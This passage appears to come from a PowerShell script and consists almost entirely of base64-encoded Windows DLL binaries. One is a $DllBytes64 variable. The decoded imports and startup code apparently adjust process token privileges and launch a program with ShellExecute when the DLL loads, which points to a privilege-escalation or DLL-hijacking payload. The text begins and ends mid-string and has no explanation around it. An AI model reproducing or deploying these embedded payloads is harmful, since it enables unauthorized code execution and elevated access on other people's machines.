AIkAAQAAAAAP////8AAAAADAAAALcUABAAAAAAJJAAEAAAAAD/////AAAAAAwAAADrKQAQ/v///wAAAADY////AAAAAP7///8AAAAAcxYAEP7///8AAAAAghYAEP7///8AAAAA2P///wAAAAD+////AAAAADUYABD+////AAAAAEEYABD+////AAAAAMD///8AAAAA/v///wAAAAC9HQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAGkrABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAADi4AEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAB3MQAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAD40ABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAAlzgAEAAAAAD+////AAAAANj///8AAAAA/v///5I6ABCWOgAQAAAAAP7///8AAAAAwP///wAAAAD+////AAAAAH88ABAAAAAA/v///wAAAADY////AAAAAP7///+7PwAQzj8AEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAZRQAQfIQAAAAAAAAAAAAAloUAABBgAABshAAAAAAAAAAAAADohQAAAGAAAGSFAAAAAAAAAAAAAAaGAAD4YAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQhQAAuIUAAKSFAAAAAAAAiIUAAICFAABshQAAEoYAACiGAAA4hgAASoYAAF6GAAB6hgAAmIYAAKyGAAC8hgAAyIYAANaGAADkhgAA7oYAAAaHAAAahwAAKocAADqHAABShwAAZIcAAHCHAAB+hwAAkIcAAKCHAADIhwAA1ocAAOiHAAAAiAAAFogAADCIAABGiAAAYIgAAG6IAAB8iAAAlogAAKaIAAC8iAAA1ogAAOKIAAD0iAAADIkAACSJAAAwiQAAOokAAEaJAABYiQAAZokAAHaJAACCiQAAmIkAAKSJAACwiQAAwIkAANaJAADoiQAAAAAAAPaFAAAAAAAAwAFHZXRDdXJyZW50UHJvY2VzcwCyBFNsZWVwAFIAQ2xvc2VIYW5kbGUAS0VSTkVMMzIuZGxsAAD3AU9wZW5Qcm9jZXNzVG9rZW4AAJYBTG9va3VwUHJpdmlsZWdlVmFsdWVBAB8AQWRqdXN0VG9rZW5Qcml2aWxlZ2VzAEFEVkFQSTMyLmRsbAAAHgFTaGVsbEV4ZWN1dGVBAFNIRUxMMzIuZGxsAMUBR2V0Q3VycmVudFRocmVhZElkAADKAERlY29kZVBvaW50ZXIAhgFHZXRDb21tYW5kTGluZUEAwARUZXJtaW5hdGVQcm9jZXNzAADTBFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAApQRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAANJc0RlYnVnZ2VyUHJlc2VudADqAEVuY29kZVBvaW50ZXIAxQRUbHNBbGxvYwAAxwRUbHNHZXRWYWx1ZQDIBFRsc1NldFZhbHVlAMYEVGxzRnJlZQDvAkludGVybG9ja2VkSW5jcmVtZW50AAAYAkdldE1vZHVsZUhhbmRsZVcAAHMEU2V0TGFzdEVycm9yAAACAkdldExhc3RFcnJvcgAA6wJJbnRlcmxvY2tlZERlY3JlbWVudAAARQJHZXRQcm9jQWRkcmVzcwAAzwJIZWFwRnJlZQAAGQFFeGl0UHJvY2VzcwBvBFNldEhhbmRsZUNvdW50AABkAkdldFN0ZEhhbmRsZQAA4wJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50APMBR2V0RmlsZVR5cGUAYwJHZXRTdGFydHVwSW5mb1cA0QBEZWxldGVDcml0aWNhbFNlY3Rpb24AEwJHZXRNb2R1bGVGaWxlTmFtZUEAAGEBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAEQVXaWRlQ2hhclRvTXVsdGlCeXRlANoBR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAzQJIZWFwQ3JlYXRlAADOAkhlYXBEZXN0cm95AKcDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAkwJHZXRUaWNrQ291bnQAAMEBR2V0Q3VycmVudFByb2Nlc3NJZAB5AkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAMsCSGVhcEFsbG9jALEDUmFpc2VFeGNlcHRpb24AADkDTGVhdmVDcml0aWNhbFNlY3Rpb24AAO4ARW50ZXJDcml0aWNhbFNlY3Rpb24AAHIBR2V0Q1BJbmZvAGgBR2V0QUNQAAA3AkdldE9FTUNQAAAKA0lzVmFsaWRDb2RlUGFnZQDSAkhlYXBSZUFsbG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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
     $DllBytes64 = "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